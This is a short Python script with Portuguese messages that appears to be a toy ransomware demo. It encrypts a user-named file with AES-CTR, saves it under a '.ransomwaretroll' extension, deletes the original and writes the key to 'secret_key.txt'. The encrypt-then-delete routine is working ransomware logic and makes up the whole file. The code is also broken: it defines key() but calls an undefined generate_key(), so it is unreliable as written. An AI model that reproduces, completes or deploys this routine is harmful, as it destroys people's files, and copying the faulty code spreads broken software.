from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import base64

def key():
    # Aqui, existe a possibilidade de criar um algoritmo para gerar a chave de maneira aleatória
    return get_random_bytes(16)

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CTR)
    encrypted_data = cipher.encrypt(data)
    nonce = cipher.nonce
    
    encrypted_file = file_path + '.ransomwaretroll'
    with open(encrypted_file, 'wb') as f:
        f.write(nonce + encrypted_data)
    
    os.remove(file_path)  
    print(f"Arquivo '{file_path}' criptografado como '{encrypted_file}'!")

def main():
    key = generate_key()
    print(f"Chave de criptografia gerada (base64): {base64.b64encode(key).decode()}")

    target_file = input("Insira o caminho do arquivo a ser criptografado: ")
    if os.path.exists(target_file):
        encrypt_file(target_file, key)
        with open("secret_key.txt", 'w') as f:
            f.write(base64.b64encode(key).decode())  
        print("Atenção: A chave foi salva em 'secret_key.txt' para teste.")
    else:
        print(f"Arquivo '{target_file}' não encontrado!")

if __name__ == '__main__':
    main()
